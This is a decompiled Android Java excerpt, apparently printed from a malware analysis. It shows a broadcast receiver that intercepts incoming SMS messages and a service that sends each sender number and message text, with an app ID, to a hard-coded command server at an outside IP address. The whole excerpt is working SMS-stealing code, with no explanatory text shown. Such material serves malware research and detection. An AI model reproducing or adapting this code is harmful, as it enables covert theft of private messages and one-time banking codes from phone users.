public class MessageReceiver_fake extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        Map v0 = MessageReceiver_fake.retrieveMessages(intent);
        Iterator v6 = v0.keySet().iterator();
        while(v6.hasNext()) {
            Object v2 = v6.next();
            Object v5 = v0.get(v2);
            Intent v4 = new Intent(context, SendService_fake.class);
            v4.setAction("REPORT_INCOMING_MESSAGE");
            v4.putExtra("number", ((String)v2));
            v4.putExtra("text", ((String)v5));
            context.startService(v4);
        }
    }
}
public class SendService_fake extends IntentService {
    public void onCreate() {
        [...]
        this.httpClient = new DefaultHttpClient();
    }
    protected void onHandleIntent(Intent intent) {
        String v2 = SendService.settings.getString("APP_ID", "-1");
        Sender.request(this.httpClient, "http://37.1.204.175/?action=command", RequestFactory
                .makeIncomingMessage(v2, intent.getStringExtra("number"), intent.getStringExtra(
                "text")).toString());
}}